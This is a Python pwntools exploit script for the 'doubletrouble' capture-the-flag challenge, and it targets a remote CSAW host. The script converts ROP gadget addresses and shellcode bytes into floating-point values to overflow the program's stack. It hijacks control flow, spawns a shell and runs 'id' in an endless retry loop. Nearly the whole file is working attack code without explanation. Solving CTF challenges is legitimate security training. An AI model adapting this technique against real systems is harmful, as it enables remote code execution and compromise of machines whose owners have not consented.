from pwn import *
import struct
import subprocess
import time

#os.environ['LD_PRELOAD'] = '/home/kylebot/Desktop/Problems/CSAQ_18/doubletrouble/libc.so.6'
e = ELF('./doubletrouble')
libc = e.libc
gadget = 0x08049111# : push esp ; mov ebx, dword ptr [esp] ; ret
pret = 0x0804977d# : pop ebp ; ret
pppret = 0x0804977b# : pop ebx ; pop esi ; pop ebp ; ret
ppppret = 0x080498a0# : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
ret = 0x804900a
hret = 0x0804984F

#context.log_level = 'debug'
def addr_to_float(addr1, addr2):
	i = addr2 << 4*8 | addr1

	# python handles this not the exact the same as c or c++ does, but generally the same
	ans = '%.30e' % struct.unpack('d', p64(i))[0]

	# this hanldes the transformation in an exact way.
	# trans is a cpp with set precision
	#trans = process('./trans')
	#trans.sendline(str(i))
	#ans = trans.recvline().strip()
	#trans.close()
	return ans

def trial():
	#r = process('./doubletrouble')
	r = remote('pwn.chal.csaw.io', 9002)
	bucket = int(r.recvline().strip(), 16)
	r.sendlineafter('How long: ', '64')
	log.info('bucket: %#x' % bucket)

	#gdb.attach(r, 'b *0x0804984F\nb *0x0804976A\ncanary')
	r.sendline(str(addr_to_float(e.plt['puts'], 0xffffffff)))
	r.sendline(str(addr_to_float(e.plt['puts'], 0xffffffff)))
	r.sendline(str(addr_to_float(e.plt['puts'], 0xffffffff)))
	r.sendline(str(addr_to_float(e.plt['puts'], ret)))

	r.sendline(str(addr_to_float(0xffffcc40-0xffffcc28+bucket, ret)))
	r.sendline(str(addr_to_float(e.got['puts'], hret)))
	r.sendline(str(addr_to_float(0xffffcc40-0xffffcc28+bucket, 0x0804979F)))

	r.sendline(str(addr_to_float(u32('\xb8\xf0\xbf\x04'), u32('\x08\xeb\x01\xfe'))))
	r.sendline(str(addr_to_float(u32('\x8b\x18AA'), u32('A\xeb\x01\xfd'))))
	r.sendline(str(addr_to_float(u32('\xb8\x2d\xa1\x04'), u32('\x08\xeb\x01\xfc'))))
	r.sendline(str(addr_to_float(u32('PP\xff\xe3'), u32('A\xeb\x01\xfb'))))
	#raw_input('>>')
	for i in range(62-5-4):
		r.sendline('-99')
	r.sendline(str(addr_to_float(e.plt['puts'], 0x7e000000)))
	r.send('id\n')
	time.sleep(0.5)
	print r.recv()
	r.send('id\n')
	time.sleep(0.5)
	print r.recv()
	r.interactive()

while True:
	try:
		trial()
	except Exception:
		pass
